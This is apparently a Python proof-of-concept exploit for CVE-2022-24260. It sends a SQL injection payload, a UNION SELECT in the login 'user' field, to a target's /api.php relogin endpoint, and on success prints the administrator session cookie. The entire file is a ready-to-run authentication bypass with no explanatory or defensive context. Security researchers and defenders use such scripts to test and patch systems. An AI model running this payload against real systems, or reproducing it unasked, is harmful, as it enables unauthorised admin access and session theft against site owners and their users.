import requests
import argparse


def parse_args():
    parser = argparse.ArgumentParser(prog="python3 CVE-2022-24260.py")
    parser.add_argument('-u', '--url', required=True, type=str, default=None)
    parser.add_argument('--proxy', required=False, type=str, default=None,
                        help="Proxy URL, support HTTP proxies (Example: http://127.0.0.1:8080)")
    return parser.parse_args()


def exploit(url, proxies):
    url = url+"/api.php"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = {"module": "relogin", "action": "login", "pass": "nope", "user": "a' UNION SELECT 'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null; #"}
    res = requests.post(url, headers=headers, data=data,
                        proxies=proxies, verify=False)
    if ('"success":true' in res.text):
        print("Success! Cookie admin is "+res.headers['Set-Cookie'])
    else:
        print("Not vulnerable")


def main():
    args = parse_args()
    url = args.url
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }
    print(url)
    exploit(url, proxies)


main()
